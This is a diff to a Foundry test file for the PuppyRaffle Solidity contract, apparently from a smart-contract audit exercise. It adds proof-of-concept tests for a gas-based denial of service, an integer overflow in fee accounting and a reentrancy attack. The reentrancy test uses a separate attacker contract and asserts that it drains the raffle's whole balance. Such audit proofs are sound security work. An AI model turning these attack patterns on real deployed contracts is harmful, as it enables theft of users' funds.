@@ -5,6 +5,9 @@ pragma experimental ABIEncoderV2;
 import {Test, console} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
 
+// import the attackerReentracy contract
+import {AttackerReentrancy} from "./attackerReentracy.sol";
+
 contract PuppyRaffleTest is Test {
     PuppyRaffle puppyRaffle;
     uint256 entranceFee = 1e18;
@@ -16,11 +19,7 @@ contract PuppyRaffleTest is Test {
     uint256 duration = 1 days;
 
     function setUp() public {
-        puppyRaffle = new PuppyRaffle(
-            entranceFee,
-            feeAddress,
-            duration
-        );
+        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
     }
 
     //////////////////////
@@ -212,5 +211,107 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.selectWinner();
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
+    }
+
+    ///////////////////////////////////////////////////
+    //    Audit Test Prove of Code (POC)           //
+    /////////////////////////////////////////////////
+
+    function testAuditPoC_DoS() public {
+        uint256 numberOfNewPlayers = 100;
+        address[] memory newPlayers = new address[](numberOfNewPlayers);
+        for (uint256 i = 0; i < numberOfNewPlayers; i++) {
+            newPlayers[i] = address(i);
+        }
+        // the starting gas remaining before player 1 enters
+        uint256 gasStart = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * newPlayers.length}(newPlayers);
+        // the  gas remaining after player 1 has entered the contract
+        uint256 gasEnd = gasleft();
+        // the gas used by the player 1 to enter the raffle
+        uint256 gasUsedFirst = gasStart - gasEnd;
+        console.log("GasUsed by player 1 after entering raffle is: ", gasUsedFirst);
+
+        // a second player enters the raffle
+        // creating the list of array for player 2
+        address[] memory newPlayers2 = new address[](numberOfNewPlayers);
+        for (uint256 i = 0; i < numberOfNewPlayers; i++) {
+            newPlayers2[i] = address(i + numberOfNewPlayers);
+        }
+        //  the starting for player 2 before entering
+        uint256 gasStart2 = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * newPlayers.length}(newPlayers2);
+        // the gas remaining after player 2 has entered the contract
+        uint256 gasEnd2 = gasleft();
+        // the gas used by the player 2 to enter the raffle
+        uint256 gasUsedSecond = gasStart2 - gasEnd2;
+        console.log("GasUsed by player 2 after entering raffle is: ", gasUsedSecond);
+        console.log("Diff between GasUsed between player 1 and 2 : ", gasUsedSecond - gasUsedFirst);
+        // the gss used by player 2 should be greater than the gas used by player 1
+        assert(gasUsedSecond > gasUsedFirst);
+    }
+
+    //proof of code for reentrancy attack
+    function testAuditPoC_Reentrancy() public {
+        // a normal user (victim) enters the raffle
+        address[] memory players = new address[](2);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
+        uint256 puppyRaffleInitialBalance = address(puppyRaffle).balance;
+        // checking the balance of the contract
+        console.log("Balance of the PuppyRaffle before attack: ", puppyRaffleInitialBalance);
+
+        // attacker contract is deployed
+        AttackerReentrancy attackContract = new AttackerReentrancy(puppyRaffle);
+        // we fund the attacker with 1 ether , in order to enter the raffle
+        attackContract.fund{value: 1 ether}();
+        uint256 attackContractInitialBalance = address(attackContract).balance;
+
+        attackContract.attack();
+        // final balance of pupply raffle and attackerContract
+        uint256 puppyRaffleFinalBalance = address(puppyRaffle).balance;
+        uint256 attackContractFinalBalance = address(attackContract).balance;
+        console.log("Balance of the PuppyRaffle after attack: ", puppyRaffleFinalBalance);
+        console.log("Balance of the attackContract after attack: ", attackContractFinalBalance);
+
+        assertEq(puppyRaffleFinalBalance, 0);
+        assertEq(attackContractFinalBalance, puppyRaffleInitialBalance + attackContractInitialBalance);
+
+        // attacker
+    }
+
+    function testAuditPoC_OverFlow() public {
+        // if (numberOfNewPlayers > 60 && numberOfNewPlayers < 100) {
+        //     return;
+        // }
+        // address[] memory players = new address[](4);
+        // players[0] = playerOne;
+        // players[1] = playerTwo;
+        // players[2] = playerThree;
+        // players[3] = playerFour;
+        // puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+        // console.log("Balance of the contract after entering: ", address(puppyRaffle).balance);
+
+        //adding more players
+        uint256 numberOfNewPlayers = 186;
+
+        address[] memory newPlayers = new address[](numberOfNewPlayers);
+        for (uint256 i = 0; i < numberOfNewPlayers; i++) {
+            newPlayers[i] = address(i);
+        }
+        // the starting gas remaining before player 1 enters
+        puppyRaffle.enterRaffle{value: entranceFee * newPlayers.length}(newPlayers);
+        console.log("Balance of the contract after entering: ", address(puppyRaffle).balance);
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+        console.log("Balance of the contract after selecting: ", address(puppyRaffle).balance);
+        //get the total fees after selecting winner
+        console.log(
+            "Total fees after selecting winner with ", newPlayers.length, " players is  ", puppyRaffle.totalFees()
+        );
+
+        //
     }
 }
